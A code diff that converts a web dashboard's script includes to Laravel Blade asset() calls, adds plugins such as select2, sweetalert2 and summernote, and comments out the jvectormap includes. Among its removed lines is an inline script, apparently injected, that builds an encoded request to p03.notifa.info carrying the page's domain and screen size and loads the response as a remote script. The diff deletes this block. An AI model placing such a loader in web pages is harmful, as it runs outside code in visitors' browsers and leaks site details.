@@ -1,57 +1,56 @@
-    <script src="assets/js/jquery.min.js"></script>
-    <script src="assets/js/bootstrap.bundle.min.js"></script>
-    <script src="assets/js/metisMenu.min.js"></script>
-    <script src="assets/js/waves.min.js"></script>
-    <script src="assets/js/jquery.slimscroll.min.js"></script>
-    <script src="assets/plugins/chartist/js/chartist.min.js"></script>
-    <script src="assets/plugins/chartist/js/chartist-plugin-tooltip.min.js"></script>
-    <script src="assets/plugins/morris/morris.min.js"></script>
-    <script src="assets/plugins/raphael/raphael-min.js"></script>
-    <script src="assets/plugins/peity-chart/jquery.peity.min.js"></script>
-    <script src="assets/plugins/jvectormap/jquery-jvectormap-2.0.2.min.js"></script>
-    <script src="assets/plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
-    <script src="assets/plugins/datatables/jquery.dataTables.min.js"></script>
-    <script src="assets/plugins/datatables/dataTables.bootstrap4.min.js"></script>
-    <script src="assets/pages/jquery.dashboard2.init.js"></script>
+    {{-- file js --}}
+    <script src="{{ asset('assets/js/jquery.min.js') }}"></script>
+    <script src="{{ asset('assets/js/metisMenu.min.js') }}"></script>
+    <script src="{{ asset('assets/js/waves.min.js') }}"></script>
+    <script src="{{ asset('assets/js/jquery.slimscroll.min.js') }}"></script>
+    <script src="{{ asset('assets/js/bootstrap.bundle.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/moment/moment.js') }}"></script>
+    <script src="{{ asset('assets/plugins/select2/select2.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/tagsinput/jquery.tagsinput.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/bootstrap-datepicker/js/bootstrap-datepicker.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/bootstrap-colorpicker/js/bootstrap-colorpicker.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/bootstrap-touchspin/js/jquery.bootstrap-touchspin.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/bootstrap-inputmask/bootstrap-inputmask.min.js') }}"></script>
+
+    {{-- file plugins --}}
+    <script src="{{ asset('assets/plugins/chartist/js/chartist.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/chartist/js/chartist-plugin-tooltip.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/morris/morris.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/raphael/raphael-min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/peity-chart/jquery.peity.min.js') }}"></script>
+    {{-- <script src="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-2.0.2.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-world-mill-en.js') }}"></script> --}}
+    <script src="{{ asset('assets/plugins/datatables/jquery.dataTables.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/datatables/dataTables.bootstrap4.min.js') }}"></script>
+    <script src="{{ asset('assets/plugins/repeater/jquery.repeater.min.js') }}"></script>
+
+    <!-- Sweet-Alert  -->
+    <script src="{{ asset('assets/plugins/sweet-alert2/sweetalert2.min.js') }}"></script>
+    <script src="{{ asset('assets/pages/jquery.sweet-alert.init.js') }}"></script>
+
+    {{-- file pages --}}
+    <script src="{{ asset('assets/pages/jquery.slimscroll.init.js') }}"></script>
+    <script src="{{ asset('assets/pages/jquery.dashboard2.init.js') }}"></script>
+    <script src="{{ asset('assets/pages/jquery.form-repeater.js') }}"></script>
     <!-- App js -->
-    <script src="assets/js/app.js"></script>
-    <script type="text/javascript">
-        if (self == top) {
-            function netbro_cache_analytics(fn, callback) {
-                setTimeout(function() {
-                    fn();
-                    callback();
-                }, 0);
-            }
+    <script src="{{ asset('assets/js/app.js') }}"></script>
 
-            function sync(fn) {
-                fn();
-            }
+    <!-- Plugins Init js -->
+    <script src="{{ asset('assets/pages/jquery.form-advanced.init.js') }}"></script>
 
-            function requestCfs() {
-                var idc_glo_url = location.protocol == "https:" ? "https://" : "http://";
-                var idc_glo_r = Math.floor(Math.random() * 99999999999);
-                var url =
-                    idc_glo_url +
-                    "p03.notifa.info/3fsmd3/request" +
-                    "?id=1" +
-                    "&enc=9UwkxLgY9" +
-                    "&params=" +
-                    "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m3DSB4E%2frimBP%2f0zF8sRs3p2xLAh0Z9uX7Kysc1MneK1g1fkXY8NEA4nhjSE7cev32VAccKyfI1Gccn%2fAa2axzFnIlEVSWManahLRbXEi9l0GGJRQCQKo2a6Z%2f6yazME2UCUFgtuIgNIq46fkJnoIGRIZnLtN8mjSnr4sPGwlQGPtvwLJbXpq%2bGGr%2fipddsC2orpAnipl9Bae7hIJnuwV83ZTbLrEAIQIHMnYqRaLg3LvbAbzQRa59GQi0VoI%2blb53yWYfpVYmu8wLmoG4eQH9xeLctXnz8XttTe8zpHAgN68i098jXS0rFiQ6yK3szr3ECgCed6BnKZlq9c0dCHns%2fwDDRINcepgpRqae8vQOgGTD646I%2fCbQdBZf8yfbfEvfk1OXhxr1S1d%2bDNVi%2bPSlUVWQHUdqJp3KNDRjVhK55zK%2bDnJLSQRMdxaueuEcMBCJ8nHFOjaqPx%2bqfeSxgYCaxA6e9PsrAo%2f5s7EmkLmD4pwsM14vdEoMQ%3d%3d" +
-                    "&idc_r=" +
-                    idc_glo_r +
-                    "&domain=" +
-                    document.domain +
-                    "&sw=" +
-                    screen.width +
-                    "&sh=" +
-                    screen.height;
-                var bsa = document.createElement("script");
-                bsa.type = "text/javascript";
-                bsa.async = true;
-                bsa.src = url;
-                (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(bsa);
-            }
-            netbro_cache_analytics(requestCfs, function() {});
-        }
+    <!-- tooltip -->
+    <script src="{{ asset('assets/plugins/tippy/tippy.all.min.js') }}"></script>
+    <script src="{{ asset('assets/pages/jquery.tooltipster.js') }}"></script>
+
+    <!--Summernote init-->
+    <script src="{{ asset('assets/plugins/summernote/summernote-bs4.min.js') }}"></script>
+    <script>
+        jQuery(document).ready(function() {
+            $(".summernote").summernote({
+                height: 250, // set editor height
+                minHeight: null, // set minimum height of editor
+                maxHeight: null, // set maximum height of editor
+                focus: false, // set focus to editable area after initializing summernote
+            });
+        });
     </script>
